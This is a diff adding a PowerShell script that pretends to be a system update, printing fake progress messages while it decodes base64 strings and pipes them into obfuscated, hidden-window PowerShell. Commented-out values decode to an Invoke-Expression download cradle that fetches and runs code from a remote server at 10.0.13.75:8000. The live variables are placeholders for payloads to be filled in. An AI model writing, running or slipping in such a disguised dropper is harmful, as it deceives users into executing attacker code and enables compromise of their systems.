@@ -1,0 +1,39 @@
+echo "[!] Preparing System for Update"
+echo "[*] ============================"
+start-sleep -s 1
+echo "[*]"
+start-sleep -s 1
+echo "[*]"
+start-sleep -s 1
+echo "[*]"
+echo "[!] Starting Update Process."
+echo "[*] ============================"
+start-sleep -s 1
+echo "[*]"
+start-sleep -s 1
+echo "[*]"
+start-sleep -s 1
+echo "[*]"
+
+$a1 = "A1BASE64"
+$r1 = "R1BASE64"
+
+# OLD STUFF
+#$a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvYTEnKQ=="
+#$r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvcjEnKQ=="
+
+start-sleep -s 1
+
+$p1 = "UG9XZVJTaEVMbDs7LW5vUCAtYyAi"
+$p2 = $p1.substring(0,28)
+
+echo "[*]"
+start-sleep -s 1
+echo "[!] Update Process Completed"
+start-sleep -s 1
+
+$update_p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p2))
+$update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1))
+$update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))
+
+echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -
